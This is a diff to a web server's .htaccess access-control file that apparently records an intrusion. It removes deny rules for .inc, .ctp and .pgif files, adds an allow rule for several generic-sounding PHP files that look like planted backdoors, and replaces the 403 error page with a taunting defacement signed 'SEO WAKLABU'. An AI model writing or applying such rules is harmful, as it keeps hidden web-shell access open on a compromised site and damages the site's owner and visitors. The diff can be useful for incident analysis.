@@ -46,23 +46,11 @@
     Order Deny,Allow
     Deny from all
 </Files>
-<Files *.inc*>
-    Order Deny,Allow
-    Deny from all
-</Files>
-<Files *.ctp*>
-    Order Deny,Allow
-    Deny from all
-</Files>
-<Files *.pgif*>
-    Order Deny,Allow
-    Deny from all
-</Files>
-<FilesMatch "\.(jpg|jpeg|png|gif|svg|bmp|ico|webp|heic)$">
+<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "\.(mp4|webm|avi|mov|wmv|mp3|wav|ogv|ogg)$">
+<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
     Order Deny,Allow
     Allow from all
 </FilesMatch>
@@ -70,8 +58,9 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(headers.php)$">
-Order allow,deny
-Allow from all
-</FilesMatch>
+<FilesMatch "^(Partitioned.php|ClassAutoLoader.php|CommonLexer.php|InflectorCache.php|headers.php|Submissions.php)$">
+        Order Deny,Allow
+    Allow from all
+    </FilesMatch>
 Options -Indexes
+ErrorDocument 403 '<center><img src="https://media1.tenor.com/m/WFV2-uyVM_0AAAAd/lloyd-frontera-lloyd.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by SEO WAKLABU</h2>
